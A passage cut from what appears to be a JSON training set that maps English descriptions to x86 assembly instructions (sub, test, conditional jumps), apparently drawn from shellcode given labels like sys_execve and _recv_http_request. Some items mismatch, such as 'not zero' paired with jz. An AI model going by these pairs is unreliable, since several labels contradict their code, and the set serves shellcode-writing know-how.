  },
  {
    "intent": "subtract 8 from the contents of eax register and save the result in eax",
    "rewritten_intent": "subtract 8 from the contents of eax register and save the result in eax",
    "snippet": "sub eax, 8",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "subtract",
      "8",
      "contents",
      "var0",
      "register",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "8"
    ]
  },
  {
    "intent": "subtract 8 from the contents of the eax register",
    "rewritten_intent": "subtract 8 from the contents of the eax register",
    "snippet": "sub eax, 8",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "subtract",
      "8",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "8"
    ]
  },
  {
    "intent": "subtract the contents of eax from the contents of eax",
    "rewritten_intent": "subtract the contents of eax from the contents of eax",
    "snippet": "sub eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "var0",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract ebx from eax",
    "rewritten_intent": "subtract ebx from eax",
    "snippet": "sub eax, ebx",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract the address in ebx from the address in eax",
    "rewritten_intent": "subtract the address in ebx from the address in eax",
    "snippet": "sub eax, ebx",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "address",
      "var0",
      "address",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 20000h from eax register",
    "rewritten_intent": "subtract 20000h from eax register",
    "snippet": "sub eax,20000h",
    "slot_map": {
      "20000h": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x2e2aa163 from ebx and save the result into ebx",
    "rewritten_intent": "subtract 0x2e2aa163 from ebx and save the result into ebx",
    "snippet": "sub ebx, 0x2e2aa163",
    "slot_map": {
      "0x2e2aa163": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x2e2aa163 from the contents in ebx and save the result in ebx",
    "rewritten_intent": "subtract 0x2e2aa163 from the contents in ebx and save the result in ebx",
    "snippet": "sub ebx, 0x2e2aa163",
    "slot_map": {
      "0x2e2aa163": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "decrease ebx by 2",
    "rewritten_intent": "decrease ebx by 2",
    "snippet": "sub ebx, 2",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "decrease",
      "var0",
      "2"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "2"
    ]
  },
  {
    "intent": "subtract the byte 3 from the contents of the ebx register",
    "rewritten_intent": "subtract the byte 3 from the contents of the ebx register",
    "snippet": "sub ebx, byte 3",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "byte",
      "3",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "byte",
      "3"
    ]
  },
  {
    "intent": "subtract the byte value 3 from the contents of ebx and save the result in ebx",
    "rewritten_intent": "subtract the byte value 3 from the contents of ebx and save the result in ebx",
    "snippet": "sub ebx, byte 3",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "byte",
      "value",
      "3",
      "contents",
      "var0",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "byte",
      "3"
    ]
  },
  {
    "intent": "subtract the byte 8 from the contents of the ebx register",
    "rewritten_intent": "subtract the byte 8 from the contents of the ebx register",
    "snippet": "sub ebx, byte 8",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "byte",
      "8",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "byte",
      "8"
    ]
  },
  {
    "intent": "subtract the byte value 8 from the contents of ebx and save the result in ebx",
    "rewritten_intent": "subtract the byte value 8 from the contents of ebx and save the result in ebx",
    "snippet": "sub ebx, byte 8",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "byte",
      "value",
      "8",
      "contents",
      "var0",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "byte",
      "8"
    ]
  },
  {
    "intent": "subtract 0x04baca01 from the contents in ecx and save the result in ecx",
    "rewritten_intent": "subtract 0x04baca01 from the contents in ecx and save the result in ecx",
    "snippet": "sub ecx, 0x04baca01",
    "slot_map": {
      "0x04baca01": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x0b454440 from the contents in ecx and save the result in ecx",
    "rewritten_intent": "subtract 0x0b454440 from the contents in ecx and save the result in ecx",
    "snippet": "sub ecx, 0x0b454440",
    "slot_map": {
      "0x0b454440": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x1525152a from the contents in ecx and save the result in ecx",
    "rewritten_intent": "subtract 0x1525152a from the contents in ecx and save the result in ecx",
    "snippet": "sub ecx, 0x1525152a",
    "slot_map": {
      "0x1525152a": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x6374612e from the contents in ecx and save the result in ecx",
    "rewritten_intent": "subtract 0x6374612e from the contents in ecx and save the result in ecx",
    "snippet": "sub ecx, 0x6374612e",
    "slot_map": {
      "0x6374612e": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "decrease ecx by 1",
    "rewritten_intent": "decrease ecx by 1",
    "snippet": "sub ecx, 1",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrease",
      "var0",
      "1"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "subtract 23 from the contents of the ecx register",
    "rewritten_intent": "subtract 23 from the contents of the ecx register",
    "snippet": "sub ecx, 23",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "23",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "23"
    ]
  },
  {
    "intent": "subtract the contents of the ecx register from the contents of the ecx register",
    "rewritten_intent": "subtract the contents of the ecx register from the contents of the ecx register",
    "snippet": "sub ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "var0",
      "register",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract the contents of ecx from the contents of ecx",
    "rewritten_intent": "subtract the contents of ecx from the contents of ecx",
    "snippet": "sub ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "var0",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract ecx from ecx and save the result into ecx",
    "rewritten_intent": "subtract ecx from ecx and save the result into ecx",
    "snippet": "sub ecx, ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "var0",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x44444444 from edi and save the result in edi",
    "rewritten_intent": "subtract 0x44444444 from edi and save the result in edi",
    "snippet": "sub edi, 0x44444444",
    "slot_map": {
      "0x44444444": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0xffffffdf from edi",
    "rewritten_intent": "subtract 0xffffffdf from edi",
    "snippet": "sub edi, 0xffffffdf",
    "slot_map": {
      "0xffffffdf": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 1768009314 from the contents of the edi register",
    "rewritten_intent": "subtract 1768009314 from the contents of the edi register",
    "snippet": "sub edi, 1768009314",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "subtract",
      "1768009314",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "1768009314"
    ]
  },
  {
    "intent": "subtract 1768009314 from the edi register and save the result in edi",
    "rewritten_intent": "subtract 1768009314 from the edi register and save the result in edi",
    "snippet": "sub edi, 1768009314",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "subtract",
      "1768009314",
      "var0",
      "register",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "1768009314"
    ]
  },
  {
    "intent": "decrease edx by 4",
    "rewritten_intent": "decrease edx by 4",
    "snippet": "sub edx, 4",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "decrease",
      "var0",
      "4"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "4"
    ]
  },
  {
    "intent": "subtract the contents of the edx register from the contents of the edx register",
    "rewritten_intent": "subtract the contents of the edx register from the contents of the edx register",
    "snippet": "sub edx, edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "var0",
      "register",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x24 from the contents in esp and save the result in esp",
    "rewritten_intent": "subtract 0x24 from the contents in esp and save the result in esp",
    "snippet": "sub esp, 0x24",
    "slot_map": {
      "0x24": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "esp",
      "and",
      "save",
      "result",
      "esp"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract the value 0x28 from the esp register",
    "rewritten_intent": "subtract the value 0x28 from the esp register",
    "snippet": "sub esp, 0x28",
    "slot_map": {
      "0x28": "var0"
    },
    "intent_tokens": [
      "subtract",
      "value",
      "var0",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 12 from esp register and save the result in esp",
    "rewritten_intent": "subtract 12 from esp register and save the result in esp",
    "snippet": "sub esp, 12",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "12",
      "esp",
      "register",
      "and",
      "save",
      "result",
      "esp"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "12"
    ]
  },
  {
    "intent": "subtract 12 from the contents of the esp register",
    "rewritten_intent": "subtract 12 from the contents of the esp register",
    "snippet": "sub esp, 12",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "12",
      "contents",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "12"
    ]
  },
  {
    "intent": "make room for one 4-byte local variable",
    "rewritten_intent": "make room for one 4-byte local variable",
    "snippet": "sub esp, 4",
    "slot_map": {
      "4-byte": "var1",
      "for": "var0"
    },
    "intent_tokens": [
      "make",
      "room",
      "var0",
      "one",
      "var1",
      "local",
      "variable"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "4"
    ]
  },
  {
    "intent": "make room on the stack for local variable",
    "rewritten_intent": "make room on the stack for local variable",
    "snippet": "sub esp, 4",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "make",
      "room",
      "stack",
      "var0",
      "local",
      "variable"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "4"
    ]
  },
  {
    "intent": "allocate memory for local variables",
    "rewritten_intent": "allocate memory for local variables",
    "snippet": "sub esp, 4",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "allocate",
      "memory",
      "var0",
      "local",
      "variables"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "4"
    ]
  },
  {
    "intent": "subtract the value 4 from the esp register and save the result in esp",
    "rewritten_intent": "subtract the value 4 from the esp register and save the result in esp",
    "snippet": "sub esp, 4",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "value",
      "4",
      "esp",
      "register",
      "and",
      "save",
      "result",
      "esp"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "4"
    ]
  },
  {
    "intent": "allocate space on the stack for local variable",
    "rewritten_intent": "allocate space on the stack for local variable",
    "snippet": "sub esp, 4",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "allocate",
      "space",
      "stack",
      "var0",
      "local",
      "variable"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "4"
    ]
  },
  {
    "intent": "make space on stack",
    "rewritten_intent": "make space on stack",
    "snippet": "sub esp, 4",
    "slot_map": {},
    "intent_tokens": [
      "make",
      "space",
      "stack"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "4"
    ]
  },
  {
    "intent": "allocate memory for a variable",
    "rewritten_intent": "allocate memory for a variable",
    "snippet": "sub esp, 4",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "allocate",
      "memory",
      "var0",
      "variable"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "4"
    ]
  },
  {
    "intent": "subtract 8 from esp and save the result in esp",
    "rewritten_intent": "subtract 8 from esp and save the result in esp",
    "snippet": "sub esp, 8",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "8",
      "esp",
      "and",
      "save",
      "result",
      "esp"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "8"
    ]
  },
  {
    "intent": "subtract the byte 0x1 from the contents of the esp register",
    "rewritten_intent": "subtract the byte 0x1 from the contents of the esp register",
    "snippet": "sub esp, byte 0x1",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "subtract",
      "byte",
      "var0",
      "contents",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "esp",
      ",",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "define sys_execve equal to 0x0b",
    "rewritten_intent": "define sys_execve equal to 0x0b",
    "snippet": "sys_execve equ 0x0b",
    "slot_map": {
      "sys_execve": "var0",
      "0x0b": "var1"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "var1"
    ]
  },
  {
    "intent": "define syscall_execve equal to 11",
    "rewritten_intent": "define syscall_execve equal to 11",
    "snippet": "syscall_execve equ 11",
    "slot_map": {
      "syscall_execve": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "11"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "11"
    ]
  },
  {
    "intent": "test the value of the al register",
    "rewritten_intent": "test the value of the al register",
    "snippet": "test al, al",
    "slot_map": {},
    "intent_tokens": [
      "test",
      "value",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "al",
      ",",
      "al"
    ]
  },
  {
    "intent": "jump to the label found if the contents of the al register is zero else increment the contents of the ecx register",
    "rewritten_intent": "jump to the label found if the contents of the al register is zero else increment the contents of the ecx register",
    "snippet": "test al, al \\n jz found \\n inc ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "found",
      "if",
      "contents",
      "al",
      "register",
      "zero",
      "else",
      "increment",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "al",
      ",",
      "al",
      "\\n",
      "jz",
      "found",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the al register is zero then jump to the label found else increment the contents of the ecx register",
    "rewritten_intent": "if the contents of the al register is zero then jump to the label found else increment the contents of the ecx register",
    "snippet": "test al, al \\n jz found \\n inc ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "al",
      "register",
      "zero",
      "then",
      "jump",
      "label",
      "found",
      "else",
      "increment",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "al",
      ",",
      "al",
      "\\n",
      "jz",
      "found",
      "\\n",
      "inc",
      "var0"
    ]
  },
  {
    "intent": "perform a bitwise and of the contents of ax and the contents of ax",
    "rewritten_intent": "perform a bitwise and of the contents of ax and the contents of ax",
    "snippet": "test ax, ax",
    "slot_map": {
      "bitwise": "var0"
    },
    "intent_tokens": [
      "perform",
      "var0",
      "and",
      "contents",
      "ax",
      "and",
      "contents",
      "ax"
    ],
    "snippet_tokens": [
      "test",
      "ax",
      ",",
      "ax"
    ]
  },
  {
    "intent": "jump to the label exeunt if the contents of the ax register is not zero else jump to the label carryon",
    "rewritten_intent": "jump to the label exeunt if the contents of the ax register is not zero else jump to the label carryon",
    "snippet": "test ax, ax \\n jnz exeunt \\n jmp carryon",
    "slot_map": {
      "exeunt": "var0",
      "carryon": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "ax",
      "register",
      "not",
      "zero",
      "else",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "ax",
      ",",
      "ax",
      "\\n",
      "jnz",
      "var0",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon",
    "rewritten_intent": "if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon",
    "snippet": "test ax, ax \\n jnz exeunt \\n jmp carryon",
    "slot_map": {
      "exeunt": "var0",
      "carryon": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "ax",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "var0",
      "else",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "ax",
      ",",
      "ax",
      "\\n",
      "jnz",
      "var0",
      "\\n",
      "jmp",
      "var1"
    ]
  },
  {
    "intent": "jump to the label not_found if the contents of the bl register is not zero",
    "rewritten_intent": "jump to the label not_found if the contents of the bl register is not zero",
    "snippet": "test bl, bl \\n jz not_found",
    "slot_map": {
      "not_found": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jz",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the bl register is not zero then jump to the label not_found",
    "rewritten_intent": "if the contents of the bl register is not zero then jump to the label not_found",
    "snippet": "test bl, bl \\n jz not_found",
    "slot_map": {
      "not_found": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jz",
      "var1"
    ]
  },
  {
    "intent": "test the value of cl",
    "rewritten_intent": "test the value of cl",
    "snippet": "test cl, cl",
    "slot_map": {},
    "intent_tokens": [
      "test",
      "value",
      "cl"
    ],
    "snippet_tokens": [
      "test",
      "cl",
      ",",
      "cl"
    ]
  },
  {
    "intent": "jump to the label ready_to_proxy if the contents of the dl register is not zero",
    "rewritten_intent": "jump to the label ready_to_proxy if the contents of the dl register is not zero",
    "snippet": "test dl, 0x1 \\n jnz ready_to_proxy",
    "slot_map": {
      "ready_to_proxy": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "dl",
      "register",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "dl",
      ",",
      "0x1",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the dl register is not zero then jump to the label ready_to_proxy",
    "rewritten_intent": "if the contents of the dl register is not zero then jump to the label ready_to_proxy",
    "snippet": "test dl, 0x1 \\n jnz ready_to_proxy",
    "slot_map": {
      "ready_to_proxy": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "dl",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "var0"
    ],
    "snippet_tokens": [
      "test",
      "dl",
      ",",
      "0x1",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "perform a bitwise and on the contents of the eax register",
    "rewritten_intent": "perform a bitwise and on the contents of the eax register",
    "snippet": "test eax, eax",
    "slot_map": {
      "bitwise": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "perform",
      "var0",
      "and",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1"
    ]
  },
  {
    "intent": "test the value of eax",
    "rewritten_intent": "test the value of eax",
    "snippet": "test eax, eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "test",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "jump to the label _convert if the contents of the eax register is not zero",
    "rewritten_intent": "jump to the label _convert if the contents of the eax register is not zero",
    "snippet": "test eax, eax \\n jnz _convert",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "jump",
      "label",
      "_convert",
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jnz",
      "_convert"
    ]
  },
  {
    "intent": "if the contents of the eax register is not zero then jump to the label _convert",
    "rewritten_intent": "if the contents of the eax register is not zero then jump to the label _convert",
    "snippet": "test eax, eax \\n jnz _convert",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "_convert"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jnz",
      "_convert"
    ]
  },
  {
    "intent": "jump to the label _parent if the contents of the eax register is not zero else restore the top of the stack into the ecx register",
    "rewritten_intent": "jump to the label _parent if the contents of the eax register is not zero else restore the top of the stack into the ecx register",
    "snippet": "test eax, eax \\n jnz _parent \\n pop ecx",
    "slot_map": {
      "_parent": "var0",
      "eax": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "zero",
      "else",
      "restore",
      "top",
      "stack",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jnz",
      "var0",
      "\\n",
      "pop",
      "var2"
    ]
  },
  {
    "intent": "if the contents of the eax register is not zero then jump to the label _parent else restore the top of the stack into the ecx register",
    "rewritten_intent": "if the contents of the eax register is not zero then jump to the label _parent else restore the top of the stack into the ecx register",
    "snippet": "test eax, eax \\n jnz _parent \\n pop ecx",
    "slot_map": {
      "eax": "var0",
      "_parent": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "var1",
      "else",
      "restore",
      "top",
      "stack",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jnz",
      "var1",
      "\\n",
      "pop",
      "var2"
    ]
  },
  {
    "intent": "jump to the label _recv_http_request if the contents of the eax register is not zero else subtract the value 0x6 from the contents of the ecx register",
    "rewritten_intent": "jump to the label _recv_http_request if the contents of the eax register is not zero else subtract the value 0x6 from the contents of the ecx register",
    "snippet": "test eax, eax \\n jnz _recv_http_request \\n sub ecx, 0x6",
    "slot_map": {
      "0x6": "var2",
      "_recv_http_request": "var0",
      "eax": "var1",
      "ecx": "var3"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "zero",
      "else",
      "subtract",
      "value",
      "var2",
      "contents",
      "var3",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jnz",
      "var0",
      "\\n",
      "sub",
      "var3",
      ",",
      "var2"
    ]
  },
  {
    "intent": "if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register",
    "rewritten_intent": "if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register",
    "snippet": "test eax, eax \\n jnz _recv_http_request \\n sub ecx, 0x6",
    "slot_map": {
      "0x6": "var1",
      "eax": "var0",
      "ecx": "var2"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "_recv_http_request",
      "else",
      "subtract",
      "value",
      "var1",
      "contents",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jnz",
      "_recv_http_request",
      "\\n",
      "sub",
      "var2",
      ",",
      "var1"
    ]
  },
  {
    "intent": "jump to the label checkforfile if the contents of the eax register is not zero",
    "rewritten_intent": "jump to the label checkforfile if the contents of the eax register is not zero",
    "snippet": "test eax, eax \\n jnz checkforfile",
    "slot_map": {
      "checkforfile": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is not zero then jump to the label checkforfile",
    "rewritten_intent": "if the contents of the eax register is not zero then jump to the label checkforfile",
    "snippet": "test eax, eax \\n jnz checkforfile",
    "slot_map": {
      "eax": "var0",
      "checkforfile": "var1"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jnz",
      "var1"
    ]
  },
  {
    "intent": "jump to the label do_next_accept if the contents of the eax register is not zero",
    "rewritten_intent": "jump to the label do_next_accept if the contents of the eax register is not zero",
    "snippet": "test eax, eax \\n jnz do_next_accept",
    "slot_map": {
      "do_next_accept": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is not zero then jump to the label do_next_accept",
    "rewritten_intent": "if the contents of the eax register is not zero then jump to the label do_next_accept",
    "snippet": "test eax, eax \\n jnz do_next_accept",
    "slot_map": {
      "do_next_accept": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
      "var0",
      "\\n",
      "jnz",
      "var1"
    ]
  },
  {
    "intent": "jump to the label exit_on_error if the contents of the eax register is not zero",
    "rewritten_intent": "jump to the label exit_on_error if the contents of the eax register is not zero",
    "snippet": "test eax, eax \\n jnz exit_on_error",
    "slot_map": {
      "exit_on_error": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "jump",
      "label",
      "var0",
      "if",
      "contents",
      "var1",
      "register",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "test",
      "var1",
      ",",
      "var1",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "if the contents of the eax register is not zero then jump to the label exit_on_error",
    "rewritten_intent": "if the contents of the eax register is not zero then jump to the label exit_on_error",
    "snippet": "test eax, eax \\n jnz exit_on_error",
    "slot_map": {
      "exit_on_error": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "if",
      "contents",
      "var0",
      "register",
      "not",
      "zero",
      "then",
      "jump",
      "label",
      "var1"
    ],
    "snippet_tokens": [
      "test",
      "var0",
      ",",
